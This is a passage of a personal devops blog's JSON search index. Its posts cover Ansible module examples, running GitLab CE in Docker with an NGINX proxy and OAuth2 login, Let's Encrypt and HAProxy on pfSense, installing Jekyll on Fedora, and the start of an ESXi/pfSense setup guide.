source projects with documentation as clear and thorough.   Ansible Glossary - If there is ever a term in this book you don’t seem to fully understand, check the glossary.   Ansible for DevOps - this book helps reach an expert level of Ansible using.   Ansible - A Beginner’s Tutorial - youtube lessons about the basics of Ansible.   ","categories": ["devops"],
        "tags": ["ansible","devops"],
        "url": "https://gainanov.pro/eng-blog/devops/ansible-getting-started/",
        "teaser": "https://gainanov.pro/eng-blog/assets/images/ansible-getting-started.png"
      },{
        "title": "Ansible. My preferred modules",
        "excerpt":"Modules are the main building blocks of Ansible and are basically reusable scripts that are used by Ansible playbooks. Ansible comes with a number of reusable modules. These include functionality for controlling services, software package installation, working with files and directories etc.   In the previous article was showed about basic actions with Ansible like a execution a task, a playbook. This one explains modules that I often use in playbooks. It covers over 80% cases of using Ansible. I want to write it for storing information in one page. It expected you know how to write and custom Ansible playbook.   For start see the next simple task that used module reboot for rebooting a server:  - name: Reboot a slow machine that might have lots of updates to apply   reboot:     reboot_timeout: 3600   In there the field name is a some description that helps to understand what doing this task. The keyword reboot is a name of used module. And the module could have a parameters that write with new row begins with a indention. The reboot_timeout is a name of parameter that need to setup the maximum seconds to wait for machine to reboot, 3600 - value of the parameter. Also you could write the parameters in one row (i.e. reboot: reboot_timeout=3600) but I don’t recommend do it because it has reduce readability.   Ok, now I list the my list of ‘must have’ modules.   copy   The copy module copies a file from the local or remote machine to a location on the remote machine.   - name: Copying file with owner and permissions   copy:     src: /srv/myfiles/foo.conf     dest: /etc/foo.conf     owner: foo     group: foo     mode: 0644  - name: Copy modules.d directory to remote hosts   copy:     src:  config/filebeat/modules.d/     dest: /etc/filebeat/modules.d/     directory_mode: yes     owner: root     group: root     mode:  0644   fetch   The fetch module works like copy, but in reverse. It is used for fetching files from remote machines and storing them locally in a file tree, organized by hostname. It works with only ONE file (not directory).   - name: Copy file into local storage in /tmp/fetched/host.example.com/tmp/somefile - fetch:     src: /tmp/somefile     dest: /tmp/fetched  - name: Copy ssh_key.pub to master machine   fetch:     src: /root/.ssh/id_rsa.pub     dest: \"./\"  - name: Copy postgresql config file to local machine   fetch:     src: /usr/local/pgsql/data/postgresql.conf     dest: \"backup/pgconf/{{ inventory_hostname }}/\"     flat: yes   template   Templates are processed by the Jinja2 templating language. This module like copy module - copies files to remote hosts. But it has provide autocomplete special files - templates, that include variables in them. For instance the template has contents This is a test file on {{ ansible_hostname }}. After run playbook with template task, the file will be copied and included This is a test file on some_hostname.   - name: Copy a template /mytemplates/foo.j2 to master machine   template:     src: /mytemplates/foo.j2     dest: /etc/file.conf     owner: root     group: wheel     mode: 0644   file   The file module creates or removes files, symlinks or directories. Also, set attributes of files, symlinks or directories.   - name: Change file ownership, group and permissions   file:     path: /etc/foo.conf     owner: foo     group: foo     mode: 0644  - name: Creates borgmatic directory if it does not exist   file:     path: /etc/borgmatic     state: directory     mode: 0755     owner: root     group: root  - name: Create file /etc/sudoers.d/telegraf   file:     path: /etc/sudoers.d/telegraf     state: touch     owner: root     group: root     mode: \"u=rw,g=,o=\"  - name: Remove file web-master.war   file:     path: /foo/bar/web-master.war     state: absent   synchronize   The copy and fetch modules copies only the defined files not full directory. I use the synchronize module for copy directory recursive with files from control to remote machine. It is a wrapper around rsync command. rsync must be installed on both the local and remote host.   - name: Synchronization of src on the control machine to dest on the remote hosts   synchronize:     src: some/relative/path     dest: /some/absolute/path  # cp -r some/relative/path/* /second/absolute/path/ - name: Synchronize two directories on one remote host   synchronize:     src: /first/absolute/path/     dest: /second/absolute/path/   delegate_to: \"{{ inventory_hostname }}\"  - name: Synchronization of two paths both on the control machine   synchronize:     src: some/relative/path     dest: /some/absolute/path   delegate_to: localhost   command   The command module takes the command name followed by a list of space-delimited arguments. It will not be processed through the shell, so variables like $HOME and operations like “&lt;”, “&gt;”, “|”, “;” and “&amp;” will not work (use the shell module if you need these features).   - name: Return somefile to registered var - somefile_content   command: cat somefile   args:     chdir: somedir/   register: somefile_content  - name: Run the command if the specified file does not exist.   command: /usr/bin/make_database.sh arg1 arg2   args:     creates: /path/to/database  - name: Run the command if the specified file already exists.   command: /usr/bin/remove_database.sh arg1 arg2   args:     removes: /path/to/database   shell   The shell module takes the command name followed by a list of space-delimited arguments. It is almost exactly like the command module but runs the command through a shell (/bin/sh) on the remote node. It also has the creates and removes parameters.   - name: Run liquibase   shell: |     docker-compose up -d db       &amp;&amp;     docker-compose run liquibase  &amp;&amp;     docker-compose down   args:     chdir: \"{{ project_dir }}\"  - name: Show replication slots   shell: |     psql -U postgres -c 'SELECT * FROM pg_replication_slots;'   register: out  - name: Run a command using a templated variable (always use quote filter to avoid injection)   shell: \"cat {{ myfile|quote }}\"   raw   The raw module allows execute command on the remote hosts that haven’t got installed Python. It is works when any other modules doesn’t.   - name: Install python2 for Ansible on Debian host    raw: bash -c \"test -e /usr/bin/python || (apt -qqy update &amp;&amp; apt install -qqy python-minimal python-simplejson)\"    register: output    changed_when: output.stdout != \"\"   service   The service module controls services on remote hosts.   - name: Start and enable service httpd, if not started   service:     name: httpd     state: started     enabled: yes  - name: Stop service httpd, if started   service:     name: httpd     state: stopped  - name: Restart service httpd, in all cases   service:     name: httpd     state: restarted   yum   The yum module installs, upgrades, downgrades, removes, and lists packages and groups with the yum package manager (such as for RedHat/CentOS). This module only works on Python 2. If you require Python 3 support see the dnf module.   - name: Install the latest version of Apache   yum:     name: httpd     state: latest  - name: Remove the Apache package   yum:     name: httpd     state: absent  - name: Upgrade all packages   yum:     name: '*'     state: latest  - name: Install KVM packages   vars:     ansible_python_interpreter: /usr/bin/python   yum:     name: \"{{ item }}\"     state: present   with_items:     - qemu-kvm     - libvirt     - libvirt-python     - libguestfs-tools     - virt-install     - bridge-utils   apt   The apt module manages apt packages (such as for Debian/Ubuntu).   - name: Update repositories cache and install Apache package   apt:     name: apache2     update_cache: yes  - name: Remove Apache package   apt:     name: apache2     state: absent  - name: Upgrade all packages to the latest version   apt:     name: \"*\"     state: latest     update_cache: yes  - name: Update all packages to the latest version   apt:     upgrade: dist  - name: Install KVM packages   apt:     name: \"{{ item }}\"   with_items:     - qemu-kvm     - bridge-utils     - libvirt-daemon     - libvirt-daemon-system     - libvirt-clients    pkgng   The pkgng module manages binary packages for FreeBSD after 9.0.   - name: Install package telegraf | FreeBSD   pkgng:     name: telegraf     state: present  - name: Remove package beats   pkgng:     name: beats     state: absent  - name: Upgrade package telegraf   pkgng:     name: telegraf     state: latest   apt_repository   The apt_repository module another useful module for working with package lists. It adds or removes an APT repositories in Ubuntu and Debian. It often is used with apt_key module.   - name: Download apt key   apt_key:     url: https://artifacts.elastic.co/GPG-KEY-elasticsearch  - name: Add Elastic repository   apt_repository:     repo: deb https://artifacts.elastic.co/packages/6.x/apt stable main  - name: Remove specified repository from sources list   apt_repository:     repo: deb http://archive.canonical.com/ubuntu hardy partner     state: absent   yum_repository   The yum_repository module like apt_repository adds or removes repositories in RPM-based Linux distributions.   - name: Add EPEL repository   yum_repository:     name: epel     description: EPEL YUM repo     baseurl: https://download.fedoraproject.org/pub/epel/$releasever/$basearch/  - name: Remove repository   yum_repository:     name: epel     state: absent  - name: Add OpenNebula repository   when: ansible_os_family|lower == 'redhat'   yum_repository:     name: opennebula     description: OpenNebula Repository - RHEL     baseurl: https://downloads.opennebula.org/repo/5.6/CentOS/7/x86_64     gpgcheck: yes     gpgkey: https://downloads.opennebula.org/repo/repo.key   user   The user module manages user accounts and user attributes.   - name: Create a backup user   user:     name: backup     home: /nfsstore/backup/  - name: Remove the user 'johnd'   user:     name: johnd     state: absent     remove: yes  - name: Create a 2048-bit SSH key for user 'jsmith'   user:     name: jsmith     generate_ssh_key: yes     ssh_key_bits: 2048   authorized_key   The authorized_key module adds or removes SSH authorized keys for particular user accounts.   - name: Set authorized key taken from file on control machine   authorized_key:     user: backup     state: present     key: \"{{ lookup('file', 'backup/id_rsa.pub') }}\"  - name: Set multiple authorized key taken from selected files   authorized_key:     user: root     state: present     key: \"{{ lookup('file', item + '_id_rsa.pub') }}\"   loop:     - jsmith     - sjobs     - rgreen   lineinfile   The lineinfile module ensures a particular line is in a file, or replace an existing line using a back-referenced regular expression. This is primarily useful when you want to change a single line in a file only.   - name: Disable SElinux (config) | RedHat   lineinfile:     path: /etc/selinux/config     regexp: '^SELINUX=enforcing'     line: 'SELINUX=disabled'  # Disable selinux immediately - name: Disable SElinux (setenforce) | RedHat   shell: setenforce 0 || true  - name: Add node IP to /etc/hosts   lineinfile:     path: /etc/hosts     regexp: '{{ item.name }}$'     line: '{{ item.ip }} {{ item.name }}'   with_items:     - ip: 10.0.0.1       name: srv1     - ip: 10.0.0.2       name: srv2   blockinfile   The blockinfile module will insert/update/remove a block of multi-line text surrounded by customizable marker lines.   - name: Add parameters for connection to host into ssh-config   blockinfile:     path: ~/.ssh/config     marker_begin: \"BEGIN {{ item.name }}\"     marker_end: \"END {{ item.name }}\"     marker: \"# {mark}\"     block: |       Host {{ item.name }}       HostName {{ item.name }}       User oneadmin     with_items:       - ip: 10.0.0.1         name: srv1       - ip: 10.0.0.2         name: srv2   debug   The debug module prints statements during execution. It can be useful for debugging variables or expressions. Useful for debugging together with the ‘when:’ directive.   - debug:     msg: \"System {{ inventory_hostname }} has gateway {{ ansible_default_ipv4.gateway }}\"   when: ansible_default_ipv4.gateway is defined  - shell: /usr/bin/uptime   register: result  - debug:     var: result     verbosity: 2   pause   The pause module pauses playbook execution for a set amount of time, or until a prompt is acknowledged. Use ctrl+c to advance a pause earlier than it is set to expire or if you need to abort a playbook run entirely. To continue early press ctrl+c and then c. To abort a playbook press ctrl+c and then a.   - name: Pause for 5 minutes   pause:     minutes: 5  - name: Pause for 30 seconds   pause:     seconds: 5   fail   The fail module fails the progress with a custom message. It can be useful with flag ingnore_error in previous task. It’s often used with some condition.   - name: build app   docker_container:     image: maven     volumes:      - \"{{ project_dir }}:/pd\"     working_dir: /pd     command: mvn clean install   register: app_build   ignore_errors: yes  - debug:     var=app_build.ansible_facts.docker_container.Output.split('\\n')  - name: fail exit when app_build failed   fail:     msg: |       app build failed!   when: app_build.failed|default(false)|bool == true   In this article I show you how to use some modules in Ansible playbooks. This list has included my preferred modules. I hope, it will be a good start to meet full features of Ansible. Also, these notes will help me to remember forgotten things.   Additional information      Getting Started with Ansible - A simple guide to Ansible’s community and resources.   Ansible Documentation - Covers all Ansible options in depth. There are few open source projects with documentation as clear and thorough.   Ansible for DevOps - this book helps reach an expert level of Ansible using.   15 Things You Should Know About Ansible - some notes to dive deep into Ansible.   ","categories": ["devops"],
        "tags": ["ansible","devops"],
        "url": "https://gainanov.pro/eng-blog/devops/ansible-preferred-modules/",
        "teaser": "https://gainanov.pro/eng-blog/assets/images/ansible-preferred-modules.png"
      },{
        "title": "GitLab CE in Docker. Deploying",
        "excerpt":"About GitLab CE   GitLab CE is an open source, cloud-based Git repository and version control system used by thousands of organizations worldwide. GitLab CE includes a host of features that enable software development teams to consolidate source code, track and manage releases, increase code quality, deploy code changes, and track the evolution of software over time.   Also included in the GitLab CE is a fully functional Continuous Integration and Delivery (CI/CD) system that can build, test, and deploy software updates as your team produces new code. Supporting the CI/CD functionality of GitLab is a private registry for Docker containers, enabling teams to streamline updates for production deployments that are running on a microservices architecture.   You can install and self-manage GitLab under and MIT license or use GitLab’s commercial software built on top of the open source edition with additional features.   Next will showed how to deploy GitLab CE quickly. The Docker will help us with it. With official Docker images based on the Omnibus GitLab package it will easy.   Omnibus GitLab is a way to package different services and tools required to run GitLab, so that most users can install it without laborious configuration.   Requirements   The GitLab has a minimum system requirements: 1 Cores, 4 GB RAM, 10 GB Storage. For a big workload read the docs.   The docker installation require installed Docker software.   Installation   Full docs are available here. I will show only main parts of it to run it quickly and easy.      There is docker-compose.yml file has included the basic configuration to start deploy GitLab as Docker container:   web:   image: 'gitlab/gitlab-ce:latest'   name: gitlab   restart: always   hostname: 'gitlab.example.com'   environment:     GITLAB_OMNIBUS_CONFIG: |       external_url 'https://gitlab.example.com'   ports:     - '80:80'     - '443:443'     - '22:22'   volumes:     - '/srv/gitlab/config:/etc/gitlab'     - '/srv/gitlab/logs:/var/log/gitlab'     - '/srv/gitlab/data:/var/opt/gitlab'  Don’t forget to change the gitlab.example.com to desired hostname. GitLab has allow to set variables with GITLAB_OMNIBUS_CONFIG for configuration GitLab.      Note: The settings contained in GITLAB_OMNIBUS_CONFIG will not be written to the gitlab.rb configuration file, they’re evaluated on load.    It’s reason then I preferable to write any customization in gitlab.rb. I show my config in next topic.      To start the installation run the command:     docker-compose up -d           To view logs after starting use next:     docker logs gitlab -f           After success starting open browser (https://gitlab.example.com)  and setup new admin password.   Some notes   I can’t start GitLab with mounted volumes in NFS Storage. The error will be:  Multiple failures occurred: * RuntimeError occurred in chef run: ruby_block[verify_chown_persisted_on_redis] (/opt/gitlab/embedded/cookbooks/cache/cookbooks/runit/libraries/provider_runit_service.rb line 148) had an error: RuntimeError: Unable to persist filesystem ownership changes of /var/log/gitlab/redis/config. See https://docs.gitlab.com/ee/administration/high_availability/nfs.html#recommended-options for guidance. * RuntimeError occurred in delayed notification: ruby_block[restart_log_service] (/opt/gitlab/embedded/cookbooks/cache/cookbooks/runit/libraries/provider_runit_service.rb line 69) had an error: RuntimeError: ruby_block[verify_chown_persisted_on_redis] (/opt/gitlab/embedded/cookbooks/cache/cookbooks/runit/libraries/provider_runit_service.rb line 148) had an error: RuntimeError: Unable to persist filesystem ownership changes of /var/log/gitlab/redis/config. See https://docs.gitlab.com/ee/administration/high_availability/nfs.html#recommended-options for guidance.   I found the simple solution and delete a row '/srv/gitlab/logs:/var/log/gitlab' from yuml-file.   Without it gitlab logs will not save in host machine but you still view logs with docker logs command.   Also you can use the next advice from docs - GitLab - Disable storage directories management.   Additional information      Dockerfile of official GitLab image -   To view what actions was doing after you start an container.   Omnibus GitLab Docs - GitLab Docker images -   The full information about installation GitLab in Docker.   Download and install GitLab -   The start page of installation process for everywhere.   GitLab Feature Comparison -   Find the difference between version of self-hosted GitLab.   ","categories": ["devops"],
        "tags": ["docker","gitlab","devops"],
        "url": "https://gainanov.pro/eng-blog/devops/deploy-gitlab-in-docker/",
        "teaser": null
      },{
        "title": "GitLab CE in Docker. Disable HTTPS",
        "excerpt":"This post shows options that should setup in GitLab settings to fully disable https. I needed because I use GitLab with external Web server (NGINX) and this server proxies traffic by local network. GitLab opens only 80 and 22 ports.   Environment   I use that I was deployed before     GitLab CE 12.3.0 (Omnibus package for Docker) - gitlab.example.com   It doesn’t matter where you host your GitLab instance, it can be self managed as usual service. But in Cloud GitLab it should be another way to configure.   Configuration   Full docs are available here.      Find and open your gitlab.rb configuration file. And add this rows:   external_url 'https://gitlab.example.com' nginx['listen_https'] = false nginx['listen_port'] = 80 nginx['redirect_http_to_https'] = false letsencrypt['enable'] = false      Restart GitLab. Run the command on the host in console   # gitlab-ctl reconfigure      Write a right configuration for you web server to proxy gitlab.example.com to the GitLab instance. I use NGINX and my configuration is:   server {     listen          443 ssl;     server_name     gitlab.example.com;      ssl_certificate /etc/letsencrypt/live/example.com/fullchain.pem;     ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem;     ssl_trusted_certificate /etc/letsencrypt/live/example.com/chain.pem;      include /etc/nginx/ssl.conf;      location / {         proxy_pass           http://192.168.40.205;  # GitLab local network IP         proxy_set_header     X-Real-IP       $remote_addr;         proxy_set_header     Host            $http_host;         proxy_set_header     Upgrade         $http_upgrade;         proxy_set_header     Connection      \"Upgrade\";         proxy_set_header     X-Forwarded-For $proxy_add_x_forwarded_for;         proxy_connect_timeout        2;         proxy_http_version           1.1;         proxy_ssl_server_name        on;         proxy_ignore_client_abort    on;         fastcgi_ignore_client_abort  on;         proxy_buffering              off;         proxy_intercept_errors       on;         proxy_buffers                16       16k;         proxy_buffer_size            16k;         client_max_body_size         0;     } }  server {     listen          80;     server_name     gitlab.example.com;      return 301 https://$host$request_uri; }   The disabling https needs only if you have external web proxy (like NGINX).   Additional information      GitLab SSL Configuration -   Official doc to configure SSL.   ","categories": ["devops"],
        "tags": ["gitlab","devops","nginx"],
        "url": "https://gainanov.pro/eng-blog/devops/gitlab-disable-https/",
        "teaser": null
      },{
        "title": "GitLab CE in Docker. External OAuth2 Authorization",
        "excerpt":"In the previous post was showed how to install GitLab CE. I want to continue the work with GitLab and want to show how to set up some configuration.   If you already has a system that stored a user profiles. And the system provides an OAuth2 interface. You can use it as single sign-on (SSO) point for other systems like GitLab. You shouldn’t create new users, not require to import any other profiles.   Environment      GitLab CE 12.3.0 (Omnibus package for Docker) - gitlab.example.com            omniauth-oauth2-generic plugin (usually installed default)           External OAuth2 provider - provider.example.com   Configuration   Full docs are available here.   Although the official note the installed GitLab has already have the omniauth-oauth2-generic package.      Adding new application to our OAuth2 provider and input Redirect URI to our GitLab:     Redirect URI: https://gitlab.example.com/users/auth/&lt;provider&gt;/callback          Where is &lt;provider&gt; is name of our External OAuth2 provider (i.e. provider.example.com) .            After submit a creation, you will get app-id and app-secret. Keep in mind them.       Open GitLab configuration file - gitlab.rb. Find OmniAuth Settings section.   Add next settings to the file:  gitlab_rails['omniauth_enabled'] = true gitlab_rails['omniauth_allow_single_sign_on'] = true gitlab_rails['omniauth_block_auto_created_users'] = false gitlab_rails['omniauth_providers'] = [   {     'name' =&gt; 'oauth2_generic',     'app_id' =&gt; 'YOUR-APP-ID',     'app_secret' =&gt; 'YOUR-APP-SECRET',     'args' =&gt; {       client_options: {         'site' =&gt; 'https://provider.example.com', # including port if necessary         'user_info_url' =&gt; '/api/v1/session',     # user profile in JSON         'authorize_url' =&gt; '/oauth/authorize',    # The authorization endpoint for your OAuth server         'token_url' =&gt; '/oauth/token'             # The token request endpoint for your OAuth server       },       user_response_structure: {         # change this if necessary (there is my configuration)         root_path: ['current_user'],     # i.e. if attributes are returned in JsonAPI format (in a 'user' node nested under a 'data' node)         attributes: { nickname: 'name' } # if the nickname attribute of a user is called 'username'       },       # optionally, you can add the following two lines to \"white label\" the display name       # of this strategy (appears in urls and Gitlab login buttons)       # If you do this, you must also replace oauth2_generic, everywhere it appears above, with the new name.       name: 'Provider', # display name for this strategy       strategy_class: \"OmniAuth::Strategies::OAuth2Generic\" # Devise-specific config option Gitlab uses to find renamed strategy     }   } ]   Change YOUR-APP-ID and YOUR-APP-SECRET to the generated app-id and app-secret earlier. And check the client_options and user_response_structure. I’ve change them to my provider. Save the modification gitlab.rb file.      Restart GitLab. Run command in the console on the host   # gitlab-ctl reconfigure      Optional. Disable standard sign up and sign in option in the first screen.   Login as admin and following to the section: Admin -&gt; Settings -&gt; General - https://gitlab.example.com/admin/application_settings       This keeps only authorize with our configured OAuth2 Provider.   That’s all. Open another browser (or incognito mode of current one) and test the authorization process with external sign up.   After successful login return to the browser with admin session and set up the new user that authorized before as a new admin.   Some notes   If you want to enable sign-in after you disable sign-in. There is no reconfigure option in omnibus-gitlab that will enable that again. After gitlab-rails console opens up, type ApplicationSetting.last.update_attributes(signin_enabled: true) and then gitlab-ctl restart. The solution was found here. I found it after I block the internal authorization and can’t login as admin.   Additional information      omniauth-oauth2-generic gem -   Provides an OmniAuth strategy for authenticating with an External OAuth2 service.   OmniAuth -   Allows users to sign in using Twitter, GitHub, and other popular services.   Enable signin repeat -   How to enable signin after disable signin in the application setting.   GitLab Feature Comparison -   Find the difference between version of self-hosted GitLab.   ","categories": ["devops"],
        "tags": ["docker","gitlab","devops"],
        "url": "https://gainanov.pro/eng-blog/devops/gitlab-with-external-authorization/",
        "teaser": null
      },{
        "title": "Installing Let's Encrypt SSL Certificate with pfSense",
        "excerpt":"Introduction   LetsEncrypt certs are 90 days, and must be renewed. Secondly, you have to be able to prove you control the name that the certificate is for. This makes things more complicated.   There are several ways to verify ownership of a domain. Firstly is create a TXT-record _acme-challenge of your DNS-name. It requires manual actions if your DNS provider doesn’t provide an API to create dns records. This method is only way to get wildcard certificates. But if we want to use not many domains in the HTTP-server, we should prefer to use option named as Standalone HTTP server.   Before to continue create DNS-records type A with domains that would be accessible with SSL.   I advice use a staging ACME-servers of LetsEncrypt for test use cases because it will only let you do 5 calls per hour.   Environment   In this article I’ll be showing you how to do this with next version of components:     pfSense 2.4.4   acme\t0.6.3   Installation   So here’s a little guide on the process to enable signed Let’s Encrypt certs on your pfSense Web interface.   acme package   Under System / Package Manager / Available Packages you should find a package called acme. Click the install button and allow it to complete.      account key   Once installed you should find Acme Certificates under the Services menu.   The first step is to create your account keys. Enter a name, select the production server if you want this to be live.      Click Create new account key to generate a key and insert it into the Account key box. Finally click the Register ACME account key, wait to get successful response, then click Save.   create certificate   The next step is to create your certificate. Under Certificates click the Add button. Enter the details such as the name and description. Set to Active, select your acme account, key size 2048 is currently standard.   Set your domain SAN, for example web.example.com, db.example.com, nginx.example.com. Each domain should be written in a separate row in the table.   The method will be how the Let’s Encrypt server will validate that you control the domain before issuing the cert.   I selected Standalone HTTP server and in the options set the listen port to 8080.      We will accomplish this with a port forward rule in the next step. This is important because the ACME server needs to be able to access this standalone HTTP server on port 80.   forward rule   Under Firewall / NAT / Port Forward create a new rule that forwards port 80 HTTP to port 8080 in your pfSense IP address which is 192.168.100.1 by default.   This allows the ACME server to communicate with your device to verify ownership.      In this picture 8080 port is bound with Standalone HTTP server in the ACME certificates page. The IP 192.168.100.1 is my pfSense local IP. Don’t forget to set Add associated filter rule in the option Filter rule association.   Open the Firewall / Rules / WAN page and check that the rule was automatically created.      issue certificate   We are ready to request a first certificate. Click an Issue/Renew button under Services / Acme / Certificates on required certificate.      The gear will turn, and after a bit you’ll see a lot of green text. If there is block that looks like:      The successful message will include this text in the end:  [Wed Feb 19 10:36:34 MSK 2020] Cert success. -----BEGIN CERTIFICATE----- &lt; ... &gt; -----END CERTIFICATE----- [Wed Feb 19 10:36:34 MSK 2020] Your cert is in  /tmp/acme/staging//nginx.example.com/nginx.example.com.cer [Wed Feb 19 10:36:34 MSK 2020] Your cert key is in  /tmp/acme/staging//nginx.example.com/nginx.example.com.key [Wed Feb 19 10:36:34 MSK 2020] The intermediate CA cert is in  /tmp/acme/staging//nginx.example.com/ca.cer [Wed Feb 19 10:36:34 MSK 2020] And the full chain certs is there:  /tmp/acme/staging//nginx.example.com/fullchain.cer [Wed Feb 19 10:36:34 MSK 2020] Run reload cmd: /tmp/acme/staging/reloadcmd.sh  IMPORT CERT cobrain-staging, ... update cert! [Wed Feb 19 10:36:35 MSK 2020] Reload success   Be sure to read it carefully! Even though it’s green and the top may say success, there could be errors listed that you’ll want to resolve.   disable firewall rules   When have done disable the NAT and Firewall Rules for security reasons. Don’t remove it, it requires for renew certificates.   auto renew (optional)   LetsEncrypt certificate as said before lives only 90 days. After that you should renew certificates. You can do it manually (just a click Issue/Renew button) or set up auto update process. For auto renew enable Acme client renewal job under Services / Acme / Settings.      I prefer to manually renew because errors is occurred frequently.   use certificates   Setup certificates to desired hosted or proxy site or webGUI for an access to them by HTTPS SSL.   In next post I will show you how to use LetsEncrypt certificates with HAproxy Package.   Some notes   If you have any issues or questions, you can reach out to me and I’d be happy to help.   Additional information      Wildcard Certificates on pfSense -   Creating Wildcard Certificates on pfSense with Let’s Encrypt.   LetsEncrypt SSL Certificate with pfSense -   LetsEncrypt SSL Certificate with pfSense on Internal Linux Server.   ACME package - pfSense -   Official documentation of ACME on pfSense site.   Acme plugin on pfSense -   Acme plugin on pfSense, add Let’s Encrypt Cert to your firewall.   ","categories": ["linux"],
        "tags": ["pfsense","linux","ssl","letsencrypt"],
        "url": "https://gainanov.pro/eng-blog/linux/installing-lets-encrypt-pfsense/",
        "teaser": null
      },{
        "title": "Installing HAProxy on pfSense with SSL access to web server",
        "excerpt":"Introduction   HAProxy is a small but powerful reverse proxy, and allows for loadbalancing between multiple (web)servers, but also acl (Access Control Lists) allow for selecting a specific backend or action depending on flexible criteria. And though many features are available through webGUI. For all possible options please look at the official HAProxy documentation.   I have an nginx service in an Linux VM as a web server with a site nginx.example.com. In next time will be second VM with another web-service. I want to utilize HAProxy on my edge router (pfSense-2.4) to proxy to their appropriate backend VMs.   Environment   In this article I’ll be showing you how to do this with next version of components:     pfSense 2.4.4   haproxy package 0.59_19 (with included haproxy 1.7.11)   Linux VM with NGINX accessed by IP 192.168.100.3   Domain nginx.example.com directed on WAN pfSense.   Installation   So this post will describe how to open a web server from Internet by HTTPS and DNS name (nginx.example.com). Now it is accessible by local ip (192.168.100.3). The pfSense is edge router. And it already has free LetsEncrypt SSL certificates (how to get them - read previous post). HAproxy will help to make it easy.   haproxy package   Under System / Package Manager / Available Packages find a package haproxy. Click the install button and allow it to complete.      configure haproxy   Once the package is installed navigate to Services &gt; HAProxy &gt; Settings  and configure the settings how you wish, make sure Enable is checked, click Save.   My setup is like so:      create backend      Backends are what HAProxy calls the actual connecting servers, this is known as “upstreams” in NGINX.    The next step is to create an HAProxy backend for a host.   I have one host with NGINX-service listened 80 port on local IP 192.168.102.3.      Repeat this for each of your seperate backend “apps” or “servers”, a tip is you can copy one interface to duplicated it, then edit it as needed.   create frontend      Frontends are what HAProxy uses to map something to a backend, in this case were mapping the hostname to a string and sending that matching traffic to the appropriate backend.    The first step is to create a frontend that will routing all user requests to right backend based on hostname information. ACL provides many functions to optimize administrate all frontends in one place.   Use secure (https) connection with LetsEncrypt SSL certificates.   My frontend configuration looks like this:      create firewall rule   Now create two firewall rules (Firewall / Rules /WAN). It is open TCP-ports 80 and 443 through WAN interface  for opening our HAProxy to the external world.         test everything   You should now be able to hit http://nginx.example.com and have it redirect to https://nginx.example.com and also correctly go to the right backend server.   The site should have a “green” status because is used a secured connection.      Some notes   After enable fronted with HTTPS I’ve got next warning message:  Starting haproxy: [WARNING] 279/113603 (85707) : Setting tune.ssl.default-dh-param to 1024 by default, if your workload permits it you should set it to at least 2048. Please set a value &gt;= 1024 to make this warning disappear.   This is not error in the first place. To fix it change DH value throw HAproxy settings webGUI (Services / HAProxy / Settings). Tuning -&gt; Max SSL Diffie-Hellman size = 2048      The solution was founded in the forum   Additional information      A walkthrough on how to proxy https traffic to multiple sites -   A blog post with screenshots with similar idea.   pfsense-haproxy-package-doc -   HAProxy pfSense package, howto.   HAProxy package - pfSense -   Official documentation of HAProxy on pfSense site.   Another instruction for using HAProxy with pfSense -   Single frontend serving multiple different domains using http.   ","categories": ["linux"],
        "tags": ["pfsense","linux","ssl","haproxy"],
        "url": "https://gainanov.pro/eng-blog/linux/installing-haproxy-pfsense/",
        "teaser": null
      },{
        "title": "Installing Jekyll on Fedora 30",
        "excerpt":"Introduction   Jekyll is simple static site generator that focuses on blogs, but can be used for all kinds of sites. It takes html templates and posts written in Markdown to generate static website which is ready to deploy on your favorite web server. Alternatively you can host it on GitHub and publish it via GitHub Pages, absolutely for free.   I use Jekyll for my blog. And official instruction doesn’t enough for me. I got some issues, really small things, and the most one is a Jekyll error. Trying to install Jekyll on the new machine, I got a error.   I need some package installed because some version of ruby binary are not available for Fedora.   Environment   In this article I use next version of installed components:     Fedora 30   ruby 2.6.3p62 (2019-04-16 revision 67580)   Installation   dnf install   I install next packages manually. It will pretty enough to install Jekyll.  sudo dnf install ruby ruby-devel rubygems-devel \\                  autoconf automake bison gcc-c++ libffi-devel libtool \\                  libyaml-devel readline-devel sqlite-devel zlib-devel \\                  openssl-devel redhat-rpm-config rubygem-nokogiri  So I am not sure that all of them are needed.   update system   Update all system gems  sudo gem install rubygems-update   Then run it  sudo gem update --system  or (if previous not work)  sudo gem update --system --install-dir=/usr/share/gems --bindir /usr/local/bin   install jekyll   Next, install gems for Jekyll and Bundler  sudo gem install jekyll bundler   Done! You may install new Jekyll site and test it locally :)   Some notes   Inside Jekyll project directory, run bundler install and bundler update --bundler to install and update the gems needed, then use bundle exec jekyll serve -d public --incremental --verbose --watch to run Jekyll on localhost. If success open URL:localhost:4000 in browser.   Additional information      Getting started with GitHub Pages -   Host a static site on GitHub.   Quickstart in Jekyll -   Let’s begin design your static site with Jekyll.   Jekyll, rvm, bundler and Fedora-   The article that I inspired by.   Jekyll on Fedora -   Jekyll instruction from Fedora developers.   minimal-mistakes -   The best theme for Jekyll that I’ve try. It is used in this blog.   ","categories": ["linux"],
        "tags": ["jekyll","linux","fedora"],
        "url": "https://gainanov.pro/eng-blog/linux/installing-jekyll-fedora/",
        "teaser": null
      },{
        "title": "ESXi. The best way to build VPN tunnel with pfSense",
        "excerpt":"Introduction   ESXi is a type-1 hypervisor, meaning it runs directly on system hardware without the need for an operating system (OS). Type-1 hypervisors are also referred to as bare-metal hypervisors because they run directly on hardware.   Also VMware vSphere Hypervisor is a free product and require a free license for the usage.   pfSense is a free and open source firewall and router that also features unified threat management, load balancing, multi WAN, and more.   Environment   In this article I have next hardware and installed software on them:     Supermicro server with two network interfaces (1 - connected to Internet, 2 - to LAN)   VMware ESXi 6.5 U3   Installation   So I have an installed ESXi hypervisor on my bare metal server. I get access to ESXi through WebGUI by local IP that ESXI have got from DHCP Server. I just open a browser and insert 10.16.65.12 in address line.   Prepare network   So after first boot I see a next window.      Set up a new vSwitch. It will use for access for created virtual machines.      Set an obvious name and select second network interface. In vmnic1 connected my laptop.      Now open Port groups tab.    Add new port group that will used to connect our software firewall (pfSense). Name it External as straight external network.      Retry it for creation Internal port group. VMs connected to this port group has access to Internet only through a firewall.      The created port group by default can be removed.      Allow to delete it.    View a result of these actions.    Add new VMKernel interface.    It needs to get access to ESXi WebGUI from our local network (192.168.112.1/24)    After that we will have two management interfaces. An old one will be removed at the end.    Upload ISO   Now we can prepare to make pfSense on ESXi. First of all add an installation ISO image.    Create an ISOs directory.     Add a downloaded ISO with pfSense.    Wait some time. After that you will see the pfsense image in ESXi.    Create VM with pfSense   Open Virtual machines page in ESXi. Click Create new VM.    Yes, create a new virtual machine.    Set name. Select type of VM.    Select where VM will be installed.    Add more space 